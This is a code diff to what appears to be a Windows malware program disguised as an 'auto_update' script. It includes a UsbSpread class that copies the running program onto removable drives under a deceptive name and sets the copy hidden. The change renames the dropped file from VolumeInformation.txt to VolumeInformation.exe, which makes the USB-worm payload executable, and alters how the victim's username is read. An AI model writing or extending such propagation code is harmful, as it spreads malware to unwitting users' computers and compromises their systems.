@@ -25,7 +25,7 @@ __filename__ = 'auto_update'
 __version__ = '1.0'
 __ostype__ = str(sys.platform)
 __os__ = str(platform.platform())
-__user__ = str(platform.node())
+__user__ = os.path.expanduser('~').split('\\')[-1]
 
 Kernel32 = ctypes.windll.kernel32
 User32 = ctypes.windll.user32
@@ -165,7 +165,7 @@ class UsbSpread(threading.Thread):
                         )
                         cmd.stdin.write(batch.encode('utf-8'))
                         cmd.stdin.flush()
-                    dst_vir = os.path.join(drive, 'VolumeInformation.txt')
+                    dst_vir = os.path.join(drive, 'VolumeInformation.exe')
                     if not os.path.exists(dst_vir):
                         shutil.copyfile(sys.argv[0], dst_vir)
                         ctypes.windll.kernel32.SetFileAttributesW(dst_vir, FILE_ATTRIBUTE_HIDDEN)
